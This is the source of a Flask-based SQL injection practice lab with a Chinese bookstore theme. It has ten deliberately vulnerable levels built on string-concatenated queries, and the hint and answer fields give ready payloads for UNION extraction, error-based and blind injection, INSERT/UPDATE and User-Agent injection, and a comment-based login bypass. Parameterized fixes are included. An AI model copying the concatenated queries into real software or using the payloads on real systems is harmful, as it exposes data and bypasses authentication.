"""
墨香书屋 SQLi Labs —— SQL 注入漏洞靶场
==========================================
仿 pikachu / DVWA 结构的多关卡 SQL 注入练习平台（内容原创，主题：在线书店）。

- 10 个关卡：数字型 / 字符型 / 括号型 / 报错 / 布尔盲注 / 时间盲注 /
  insert / update / User-Agent 头注入 / 万能密码
- 4 档难度：low（无过滤）/ medium（转义单引号）/ high（追加 union 黑名单）/ impossible（参数化查询）
- 登录门槛 + 通关进度 + 提示/答案/修复建议

部署：
    Docker:  docker compose up --build -d
    直接跑:  pip install -r requirements.txt && python app.py
    默认端口 8000，账号 admin / admin123（可用环境变量覆盖）

仅供授权环境下的安全学习，禁止用于非法用途。
"""

import os
import re
import sqlite3
import time

from flask import (
    Flask,
    abort,
    redirect,
    render_template,
    request,
    session,
    url_for,
)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "sqli-labs-change-me")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.environ.get("DB_PATH", os.path.join(BASE_DIR, "lab.db"))
PORT = int(os.environ.get("PORT", "8000"))
FLAG = os.environ.get("FLAG", "FLAG{moxiang_bookstore_pwned}")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin123")

DIFFICULTIES = ("low", "medium", "high", "impossible")


# ===========================================================================
# 数据库
# ===========================================================================
def get_db() -> sqlite3.Connection:
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con


def init_db() -> None:
    con = get_db()
    try:
        con.executescript(
            """
            CREATE TABLE IF NOT EXISTS books (
                id     INTEGER PRIMARY KEY,
                title  TEXT, author TEXT,
                price  REAL, stock   INTEGER
            );
            CREATE TABLE IF NOT EXISTS orders (
                id       INTEGER PRIMARY KEY,
                order_no TEXT, book_id INTEGER,
                qty      INTEGER, status TEXT
            );
            CREATE TABLE IF NOT EXISTS members (
                id       INTEGER PRIMARY KEY,
                username TEXT, email TEXT, bio TEXT
            );
            CREATE TABLE IF NOT EXISTS access_log (
                id INTEGER PRIMARY KEY,
                ua TEXT, ip TEXT, ts TEXT
            );
            CREATE TABLE IF NOT EXISTS staff (
                id INTEGER PRIMARY KEY,
                username TEXT, password TEXT, role TEXT
            );
            CREATE TABLE IF NOT EXISTS flag (secret TEXT);
            """
        )
        con.execute("DELETE FROM books")
        con.execute("DELETE FROM orders")
        con.execute("DELETE FROM members")
        con.execute("DELETE FROM access_log")
        con.execute("DELETE FROM staff")
        con.execute("DELETE FROM flag")
        con.executemany(
            "INSERT INTO books (title, author, price, stock) VALUES (?, ?, ?, ?)",
            [
                ("三体", "刘慈欣", 23.0, 120),
                ("活着", "余华", 28.0, 88),
                ("百年孤独", "马尔克斯", 45.0, 40),
                ("代码大全", "Steve McConnell", 128.0, 15),
                ("白夜行", "东野圭吾", 39.5, 66),
            ],
        )
        con.executemany(
            "INSERT INTO orders (order_no, book_id, qty, status) VALUES (?, ?, ?, ?)",
            [
                ("MO20260901001", 1, 1, "已发货"),
                ("MO20260902002", 3, 2, "已签收"),
                ("MO20260903003", 5, 1, "配送中"),
            ],
        )
        con.executemany(
            "INSERT INTO members (username, email, bio) VALUES (?, ?, ?)",
            [("zhangsan", "zs@example.com", "爱读科幻"), ("lisi", "ls@example.com", "推理迷")],
        )
        con.executemany(
            "INSERT INTO access_log (ua, ip, ts) VALUES (?, ?, ?)",
            [
                ("Mozilla/5.0 (Windows NT 10.0)", "192.168.1.10", "2026-09-17 09:00:00"),
                ("curl/8.21.0", "192.168.1.15", "2026-09-17 09:05:00"),
            ],
        )
        con.executemany(
            "INSERT INTO staff (username, password, role) VALUES (?, ?, ?)",
            [
                ("store_admin", "sup3r_s3cret_pwd", "admin"),
                ("clerk01", "clerk_pass_111", "staff"),
            ],
        )
        con.execute("INSERT INTO flag (secret) VALUES (?)", (FLAG,))
        con.commit()
    finally:
        con.close()


# ===========================================================================
# 难度过滤
# ===========================================================================
def apply_filter(value: str, level: str) -> str:
    """对用户输入按难度施加过滤（impossible 不走拼接，直接参数化）。"""
    if level == "medium":
        # 模拟 mysql_real_escape_string：转义单引号 → 字符型注入失效，数字型仍可用
        return value.replace("'", "''")
    if level == "high":
        v = value.replace("'", "''")
        # 单次正则删除 union（提示：uniunionon 这类嵌套写法可绕过）
        return re.sub(r"union", "", v, flags=re.I)
    return value


# ===========================================================================
# 报错注入用自定义函数（模拟 MySQL extractvalue 把数据带进报错）
# ===========================================================================
_LEAKED = {"value": None}


def leak(x) -> None:
    # 记录要带出的数据再抛异常；SQLite 驱动不透传自定义异常消息，
    # 所以由 run_query 把 _LEAKED 拼回错误信息，模拟"报错回显数据"
    _LEAKED["value"] = str(x)
    raise RuntimeError("leak() called")


def with_funcs(con: sqlite3.Connection) -> sqlite3.Connection:
    con.create_function("leak", 1, leak)
    con.create_function("sleep", 1, lambda s: (time.sleep(float(s)), 0)[1])
    return con


def run_query(sql: str, params: tuple = (), commit: bool = False) -> dict:
    """执行 SQL，返回统一结果结构（用于关卡渲染）。"""
    con = with_funcs(get_db())
    result = {"sql": sql, "rows": [], "columns": [], "message": "", "elapsed": None, "error": None}
    start = time.time()
    try:
        cur = con.execute(sql, params)
        result["rows"] = [dict(r) for r in cur.fetchall()]
        result["columns"] = list(result["rows"][0].keys()) if result["rows"] else []
        if commit:
            con.commit()
    except sqlite3.Error as e:
        msg = str(e)
        if _LEAKED["value"] is not None:
            # leak() 被触发：把带出的数据放回报错信息（模拟报错注入回显）
            msg = f"RuntimeError: LEAKED:{_LEAKED['value']}（原始错误：{msg}）"
            _LEAKED["value"] = None
        result["error"] = msg
    finally:
        con.close()
    result["elapsed"] = round(time.time() - start, 3)
    return result


# ===========================================================================
# 关卡定义（内容 = 处理函数）
# ===========================================================================
def _contains_flag(result: dict) -> bool:
    blob = str(result.get("rows", "")) + str(result.get("message", "")) + str(result.get("error", ""))
    return FLAG in blob


# ---- 1. 数字型回显注入 -------------------------------------------------------
def p_num_union(f, level):
    sql = f"SELECT id, title, author, price FROM books WHERE id = {f['id']}"
    r = run_query(sql)
    r["message"] = f"共查询到 {len(r['rows'])} 本图书"
    return r


def s_num_union(f, level):
    sql = "SELECT id, title, author, price FROM books WHERE id = ?"
    r = run_query(sql, (f["id"],))
    r["message"] = "参数化查询（impossible）：" + r["message"]
    return r


# ---- 2. 字符型回显注入 -------------------------------------------------------
def p_char_union(f, level):
    sql = f"SELECT id, title, author FROM books WHERE title LIKE '%{f['title']}%'"
    r = run_query(sql)
    r["message"] = f"搜索到 {len(r['rows'])} 本图书"
    return r


def s_char_union(f, level):
    sql = "SELECT id, title, author FROM books WHERE title LIKE ?"
    r = run_query(sql, (f"%{f['title']}%",))
    r["message"] = "参数化查询（impossible）：搜索到 %d 本图书" % len(r["rows"])
    return r


# ---- 3. 括号型注入 -----------------------------------------------------------
def p_bracket(f, level):
    sql = f"SELECT id, order_no, status FROM orders WHERE (order_no = '{f['order_no']}')"
    r = run_query(sql)
    r["message"] = f"共 {len(r['rows'])} 笔订单"
    return r


def s_bracket(f, level):
    r = run_query("SELECT id, order_no, status FROM orders WHERE (order_no = ?)", (f["order_no"],))
    r["message"] = "参数化查询（impossible）：共 %d 笔订单" % len(r["rows"])
    return r


# ---- 4. 报错注入 -------------------------------------------------------------
def p_error(f, level):
    sql = f"SELECT id, title, stock FROM books WHERE title = '{f['title']}'"
    r = run_query(sql)
    if r["error"]:
        r["message"] = "数据库执行出错，错误信息如下（注意观察是否带出了数据）："
    else:
        r["message"] = f"查询成功，库存 {sum(int(b['stock']) for b in r['rows'])} 册"
    return r


def s_error(f, level):
    r = run_query("SELECT id, title, stock FROM books WHERE title = ?", (f["title"],))
    r["message"] = "参数化查询（impossible）：无报错回显风险"
    return r


# ---- 5. 布尔盲注 -------------------------------------------------------------
def p_bool(f, level):
    sql = f"SELECT order_no, status FROM orders WHERE order_no = '{f['order_no']}'"
    r = run_query(sql)
    r["found"] = len(r["rows"]) > 0
    r["message"] = "订单存在" if r["found"] else "订单不存在"
    r["rows"] = []  # 盲注：不回显数据
    return r


def s_bool(f, level):
    r = run_query("SELECT order_no, status FROM orders WHERE order_no = ?", (f["order_no"],))
    r["found"] = len(r["rows"]) > 0
    r["message"] = "参数化查询（impossible）：" + ("订单存在" if r["found"] else "订单不存在")
    r["rows"] = []
    return r


# ---- 6. 时间盲注 -------------------------------------------------------------
def p_time(f, level):
    sql = f"SELECT order_no, status FROM orders WHERE order_no = '{f['order_no']}'"
    r = run_query(sql)
    r["message"] = f"查询完成，耗时 {r['elapsed']} 秒（正常应 <0.1s）"
    r["rows"] = []
    return r


def s_time(f, level):
    r = run_query("SELECT order_no, status FROM orders WHERE order_no = ?", (f["order_no"],))
    r["message"] = f"参数化查询（impossible）：耗时 {r['elapsed']} 秒"
    r["rows"] = []
    return r


# ---- 7. insert 注入（注册） ----------------------------------------------------
def p_insert(f, level):
    sql = (
        "INSERT INTO members (username, email, bio) "
        f"VALUES ('{f['username']}', '{f['email']}', '{f['bio']}')"
    )
    r = run_query(sql, commit=True)
    if not r["error"]:
        r["message"] = f"注册成功，欢迎 {f['username']}！请到「我的资料」查看个人信息。"
        r["link"] = (f"/member/profile?username={f['username']}", "我的资料")
    return r


def s_insert(f, level):
    con = with_funcs(get_db())
    try:
        con.execute(
            "INSERT INTO members (username, email, bio) VALUES (?, ?, ?)",
            (f["username"], f["email"], f["bio"]),
        )
        con.commit()
    except sqlite3.Error as e:
        return {"sql": "INSERT ... VALUES (?, ?, ?)", "rows": [], "columns": [],
                "message": "参数化查询（impossible）注册失败: %s" % e, "elapsed": None, "error": None}
    return {"sql": "INSERT ... VALUES (?, ?, ?)", "rows": [], "columns": [],
            "message": "参数化查询（impossible）：注册成功", "elapsed": None, "error": None}


# ---- 8. update 注入（修改资料） -------------------------------------------------
def p_update(f, level):
    sql = f"UPDATE members SET bio = '{f['bio']}' WHERE username = '{f['username']}'"
    r = run_query(sql, commit=True)
    if not r["error"]:
        r["message"] = "资料修改成功，请到「我的资料」查看。"
        r["link"] = (f"/member/profile?username={f['username']}", "我的资料")
    return r


def s_update(f, level):
    con = with_funcs(get_db())
    try:
        con.execute("UPDATE members SET bio = ? WHERE username = ?", (f["bio"], f["username"]))
        con.commit()
    except sqlite3.Error as e:
        return {"sql": "UPDATE ... WHERE username = ?", "rows": [], "columns": [],
                "message": "参数化查询（impossible）修改失败: %s" % e, "elapsed": None, "error": None}
    finally:
        con.close()
    return {"sql": "UPDATE ... WHERE username = ?", "rows": [], "columns": [],
            "message": "参数化查询（impossible）：修改成功", "elapsed": None, "error": None}


# ---- 9. User-Agent 头注入 -----------------------------------------------------
def p_ua(f, level):
    ua = request.headers.get("User-Agent", "")
    ip = request.headers.get("X-Forwarded-For", "127.0.0.1")
    sql = f"INSERT INTO access_log (ua, ip, ts) VALUES ('{ua}', '{ip}', datetime('now','localtime'))"
    r = run_query(sql, commit=True)
    if not r["error"]:
        r["message"] = "登录请求已记录，请到「访问日志」查看。"
        r["link"] = ("/admin/log", "访问日志")
    return r


def s_log(f, level):
    con = with_funcs(get_db())
    try:
        con.execute(
            "INSERT INTO access_log (ua, ip, ts) VALUES (?, ?, datetime('now','localtime'))",
            (request.headers.get("User-Agent", ""), request.headers.get("X-Forwarded-For", "127.0.0.1")),
        )
        con.commit()
    except sqlite3.Error as e:
        return {"sql": "INSERT ... VALUES (?, ?, ?)", "rows": [], "columns": [],
                "message": "参数化查询（impossible）记录失败: %s" % e, "elapsed": None, "error": None}
    return {"sql": "INSERT ... VALUES (?, ?, ?)", "rows": [], "columns": [],
            "message": "参数化查询（impossible）：已记录，请到「访问日志」查看。",
            "elapsed": None, "error": None,
            "link": ("/admin/log", "访问日志")}


# ---- 10. 万能密码 -------------------------------------------------------------
def p_login(f, level):
    sql = f"SELECT id, username, role FROM staff WHERE username = '{f['username']}' AND password = '{f['password']}'"
    r = run_query(sql)
    if r["rows"]:
        who = r["rows"][0]
        r["message"] = f"登录成功，欢迎 {who['username']}（{who['role']}）。"
        if who["role"] == "admin":
            # 把 flag 塞进 rows 里，才能在页面「结果」区直接展示
            r["rows"] = [{"flag": FLAG, "user": who["username"], "role": who["role"]}]
    else:
        r["message"] = "登录失败：用户名或密码错误"
    return r


def s_login(f, level):
    r = run_query(
        "SELECT id, username, role FROM staff WHERE username = ? AND password = ?",
        (f["username"], f["password"]),
    )
    r["message"] = "参数化查询（impossible）：" + ("登录成功" if r["rows"] else "登录失败")
    return r


CHALLENGE_LIST = [
    # (cid, 标题, 分类)
    ("num-union", "1. 数字型回显注入", "回显注入"),
    ("char-union", "2. 字符型回显注入", "回显注入"),
    ("bracket", "3. 括号型注入", "回显注入"),
    ("error", "4. 报错注入", "回显注入"),
    ("bool", "5. 布尔盲注", "盲注"),
    ("time", "6. 时间盲注", "盲注"),
    ("insert", "7. insert 注入（注册页）", "增删改注入"),
    ("update", "8. update 注入（改资料）", "增删改注入"),
    ("ua", "9. User-Agent 头注入", "HTTP 头注入"),
    ("login", "10. 万能密码登录", "逻辑利用"),
]

CHALLENGES = {
    "num-union": {
        "title": "数字型回显注入", "category": "回显注入", "method": "GET",
        "desc": "图书详情页按 id 查询。id 直接拼接进 SQL（数字型，无引号包裹）。",
        "goal": "用 UNION SELECT 把 flag 表的数据回显到页面。",
        "fields": [{"name": "id", "label": "图书 ID", "value": "1"}],
        "hint": "先用 1 order by 5 判断列数（本关 SELECT 了 4 列，order by 5 会报错），再 0 UNION SELECT 1,2,3,(SELECT secret FROM flag)。",
        "answer": "0 UNION SELECT 1,2,3,(SELECT secret FROM flag)\n# 高难度（union 被删）可改用盲注：1 AND (SELECT unicode(substr(secret,1,1)) FROM flag)=70",
        "process": p_num_union, "safe": s_num_union,
    },
    "char-union": {
        "title": "字符型回显注入", "category": "回显注入", "method": "GET",
        "desc": "图书搜索页。关键词被 %...% 和单引号包裹后拼接进 LIKE。",
        "goal": "闭合引号后用 UNION SELECT 回显 flag 表的数据。",
        "fields": [{"name": "title", "label": "书名关键词", "value": "三体"}],
        "hint": "先 %' order by 4 探列数；-- 注释掉尾部多余的引号和 %。",
        "answer": "x%' UNION SELECT 1,2,(SELECT secret FROM flag)-- ",
        "process": p_char_union, "safe": s_char_union,
    },
    "bracket": {
        "title": "括号型注入", "category": "回显注入", "method": "GET",
        "desc": "订单查询页。SQL 为 WHERE (order_no = '...')，多了一层括号。",
        "goal": "闭合括号和引号，用 UNION SELECT 回显 flag 表的数据。",
        "fields": [{"name": "order_no", "label": "订单号", "value": "MO20260901001"}],
        "hint": "需要先用 ') 闭合，再 UNION，最后 -- 注释掉尾部。列数为 3。",
        "answer": "') UNION SELECT 1,2,(SELECT secret FROM flag)-- ",
        "process": p_bracket, "safe": s_bracket,
    },
    "error": {
        "title": "报错注入", "category": "回显注入", "method": "GET",
        "desc": "库存查询页。查询出错时错误信息会直接显示在页面上。内置函数 leak(x) 会抛出带 x 内容的异常（模拟 MySQL extractvalue 的报错带数）。",
        "goal": "让报错信息中带出 flag 表的数据。",
        "fields": [{"name": "title", "label": "书名", "value": "三体"}],
        "hint": "构造一个必然报错的表达式，并把子查询塞进 leak() 的参数里。",
        "answer": "x' OR leak((SELECT secret FROM flag)) OR '",
        "process": p_error, "safe": s_error,
    },
    "bool": {
        "title": "布尔盲注", "category": "盲注", "method": "GET",
        "desc": "订单状态查询页。页面只返回「订单存在 / 订单不存在」，不回显任何数据。",
        "goal": "利用真假两种页面差异，逐字符猜出 flag 表的内容。",
        "fields": [{"name": "order_no", "label": "订单号", "value": "MO20260901001"}],
        "hint": "x' OR (子查询)=真 OR ' —— 子查询为真时订单「存在」，为假时「不存在」。",
        "answer": "x' OR (SELECT substr(secret,1,1) FROM flag)='F' OR '\n# 用 substr(secret,N,1) 逐位、二分猜解；medium 难度改用 unicode() 避开引号",
        "process": p_bool, "safe": s_bool,
    },
    "time": {
        "title": "时间盲注", "category": "盲注", "method": "GET",
        "desc": "物流查询页。页面无任何差异回显，但条件成立时会执行 sleep(2) 造成 2 秒延迟。",
        "goal": "通过响应时间差异，逐字符猜出 flag 表的内容。",
        "fields": [{"name": "order_no", "label": "订单号", "value": "MO20260901001"}],
        "hint": "条件 AND 1=sleep(2)：条件为真才延迟。观察响应耗时即可判断真假。",
        "answer": "x' OR (SELECT substr(secret,1,1) FROM flag)='F' AND 1=sleep(2) OR '",
        "process": p_time, "safe": s_time,
    },
    "insert": {
        "title": "insert 注入（注册页）", "category": "增删改注入", "method": "POST",
        "desc": "会员注册页。username/email/bio 三个字段都直接拼进 INSERT 语句。",
        "goal": "利用字符串拼接符 || 把子查询结果写进 bio 字段，再到「我的资料」页面读取。",
        "fields": [
            {"name": "username", "label": "用户名", "value": "guest01"},
            {"name": "email", "label": "邮箱", "value": "guest01@example.com"},
            {"name": "bio", "label": "个人简介", "value": "大家好"},
        ],
        "hint": "VALUES ('...', '...', '<注入点>')，在单引号内用 || 拼接子查询，不需要闭合引号。",
        "answer": "bio 填入：'||(SELECT secret FROM flag)||'\n注册成功后到「我的资料」页输入刚才的用户名即可看到 flag。",
        "process": p_insert, "safe": s_insert,
    },
    "update": {
        "title": "update 注入（改资料）", "category": "增删改注入", "method": "POST",
        "desc": "资料修改页。bio 字段直接拼进 UPDATE 语句。",
        "goal": "把子查询结果写进 bio，再到「我的资料」页面读取。",
        "fields": [
            {"name": "username", "label": "要修改的用户名", "value": "zhangsan"},
            {"name": "bio", "label": "新简介", "value": "依然爱读科幻"},
        ],
        "hint": "SET bio = '<注入点>'，同样用 || 拼接子查询。",
        "answer": "bio 填入：'||(SELECT secret FROM flag)||'\n修改成功后到「我的资料」页查看。",
        "process": p_update, "safe": s_update,
    },
    "ua": {
        "title": "User-Agent 头注入", "category": "HTTP 头注入", "method": "POST",
        "desc": "会员登录页。服务端会把请求头 User-Agent 原样拼进 INSERT 记录到访问日志，日志页会展示 UA 内容。",
        "goal": "在 User-Agent 里注入，把 flag 写进日志表并在日志页回显。",
        "fields": [
            {"name": "username", "label": "用户名", "value": "zhangsan"},
            {"name": "password", "label": "密码", "value": "123456"},
        ],
        "hint": "UA 属于 INSERT 的字符串位，同样用 || 拼接。用 curl -A 或浏览器插件改 UA。",
        "answer": "User-Agent 设为：'||(SELECT secret FROM flag)||'\n提交后到「访问日志」页查看。",
        "process": p_ua, "safe": s_log,
    },
    "login": {
        "title": "万能密码登录", "category": "逻辑利用", "method": "POST",
        "desc": "员工后台登录页。账号密码直接拼进 WHERE 条件。",
        "goal": "绕过验证以 admin 身份登录，页面会给出 flag。",
        "fields": [
            {"name": "username", "label": "用户名", "value": "store_admin"},
            {"name": "password", "label": "密码", "value": "wrong_password"},
        ],
        "hint": "让 WHERE 条件恒真，或用注释截掉密码校验。注意要以 admin 角色登录才能拿 flag。",
        "answer": "username：store_admin'--\npassword：随意",
        "process": p_login, "safe": s_login,
    },
}

# 修复建议（防御方法），按关卡 id 提供示例代码
FIXES = {
    "num-union": """# 数字型参数：先强转整数，再参数化查询
book_id = int(request.args.get("id", 0))
row = db.execute("SELECT id, title, author, price FROM books WHERE id = ?",
                 (book_id,)).fetchone()""",
    "char-union": """# 字符型参数：参数化查询（占位符传参，而不是字符串拼接）
kw = f"%{request.args.get('title', '')}%"
rows = db.execute("SELECT id, title, author FROM books WHERE title LIKE ?",
                  (kw,)).fetchall()""",
    "bracket": """# 同样参数化；不要因为多层括号/引号就放弃占位符
rows = db.execute("SELECT id, order_no, status FROM orders WHERE (order_no = ?)",
                  (order_no,)).fetchall()""",
    "error": """# 1) 参数化查询消除注入点
# 2) 生产环境关闭详细报错回显（自定义统一错误页），避免报错带出数据""",
    "bool": """# 参数化查询；同时保证页面不暴露可枚举的真假差异（统一提示语、统一耗时）""",
    "time": """# 参数化查询；数据库账号最小权限；监控慢查询/异常延迟告警""",
    "insert": """# INSERT 同样使用占位符
db.execute("INSERT INTO members (username, email, bio) VALUES (?, ?, ?)",
           (username, email, bio))""",
    "update": """# UPDATE 使用占位符，且按会话身份（而非页面传参）确定目标行
db.execute("UPDATE members SET bio = ? WHERE username = ?",
           (bio, session["username"]))""",
    "ua": """# 任何来自请求头/环境的数据都是不可信输入，入库一律参数化
db.execute("INSERT INTO access_log (ua, ip, ts) VALUES (?, ?, ?)", (ua, ip, now))""",
    "login": """# 认证查询参数化 + 密码哈希存储
row = db.execute("SELECT id, username, role FROM staff WHERE username = ?",
                 (username,)).fetchone()
if row and check_password_hash(row["password"], password): ...""",
}

for _cid, _title, _cat in CHALLENGE_LIST:
    CHALLENGES[_cid]["fix"] = FIXES[_cid]


# ===========================================================================
# 路由
# ===========================================================================
def current_difficulty() -> str:
    return session.get("difficulty", "low")


def solved_set() -> set:
    return set(session.get("solved", []))


@app.before_request
def require_login():
    allowed = {"gate_login", "static", "healthz"}
    if request.endpoint not in allowed and not session.get("user"):
        return redirect(url_for("gate_login"))
    return None


@app.route("/login", methods=["GET", "POST"])
def gate_login():
    error = ""
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["user"] = ADMIN_USER
            return redirect(url_for("index"))
        error = "用户名或密码错误"
    return render_template("gate_login.html", error=error)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("gate_login"))


@app.route("/")
def index():
    groups = {}
    for cid, title, category in CHALLENGE_LIST:
        groups.setdefault(category, []).append(
            {"cid": cid, "title": title, "solved": cid in solved_set()}
        )
    return render_template(
        "index.html",
        groups=groups,
        total=len(CHALLENGE_LIST),
        solved=len(solved_set()),
        difficulty=current_difficulty(),
    )


@app.route("/difficulty", methods=["POST"])
def set_difficulty():
    level = request.form.get("level", "low")
    if level in DIFFICULTIES:
        session["difficulty"] = level
    return redirect(request.referrer or url_for("index"))


@app.route("/challenge/<cid>", methods=["GET", "POST"])
def challenge(cid):
    cfg = CHALLENGES.get(cid)
    if not cfg:
        abort(404)
    level = current_difficulty()
    result = None

    # GET 型关卡带上查询参数、或 POST 提交时才执行查询
    should_process = request.method == "POST" or (
        cfg["method"] == "GET" and any(k in request.args for k in (fd["name"] for fd in cfg["fields"]))
    )
    if should_process:
        def read_field(name: str) -> str:
            if request.method == "POST":
                return request.form.get(name, "")
            return request.args.get(name, "")

        fields = {fd["name"]: apply_filter(read_field(fd["name"]), level) for fd in cfg["fields"]}
        if level == "impossible":
            result = cfg["safe"](fields, level)
            result["impossible"] = True
        else:
            result = cfg["process"](fields, level)
            result["impossible"] = False
        # 回显类关卡：结果里出现 flag 就自动记录通关
        if result and _contains_flag(result):
            s = solved_set()
            s.add(cid)
            session["solved"] = sorted(s)
        result["fields_echo"] = fields

    return render_template(
        "challenge.html",
        cid=cid, cfg=cfg, result=result,
        level=level, difficulties=DIFFICULTIES,
        solved=cid in solved_set(),
    )


# ---- 二阶回显页面（参数化，安全） ----------------------------------------------
@app.route("/member/profile")
def member_profile():
    username = request.args.get("username", "")
    con = get_db()
    try:
        row = con.execute(
            "SELECT username, email, bio FROM members WHERE username = ?", (username,)
        ).fetchone()
    finally:
        con.close()
    member = dict(row) if row else None
    return render_template("profile.html", member=member, username=username)


@app.route("/admin/log")
def access_log_view():
    con = get_db()
    try:
        rows = con.execute("SELECT ua, ip, ts FROM access_log ORDER BY id DESC LIMIT 20").fetchall()
    finally:
        con.close()
    return render_template("ua_log.html", rows=[dict(r) for r in rows])


# ---- flag 校验（盲注关卡用） ---------------------------------------------------
@app.route("/flag/<cid>", methods=["POST"])
def submit_flag(cid):
    if cid not in CHALLENGES:
        abort(404)
    if request.form.get("flag", "").strip() == FLAG:
        s = solved_set()
        s.add(cid)
        session["solved"] = sorted(s)
        return redirect(url_for("challenge", cid=cid))
    return redirect(url_for("challenge", cid=cid))


# ---- 管理 ------------------------------------------------------------------
@app.route("/admin", methods=["GET", "POST"])
def admin():
    msg = ""
    if request.method == "POST":
        if request.form.get("action") == "reset_db":
            init_db()
            msg = "数据库已重置（会员/订单/日志已恢复初始状态）"
        elif request.form.get("action") == "reset_progress":
            session["solved"] = []
            msg = "通关进度已清零"
    return render_template("admin.html", msg=msg, flag_set=FLAG)


@app.route("/healthz")
def healthz():
    return {"status": "ok"}


if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=PORT, debug=False)
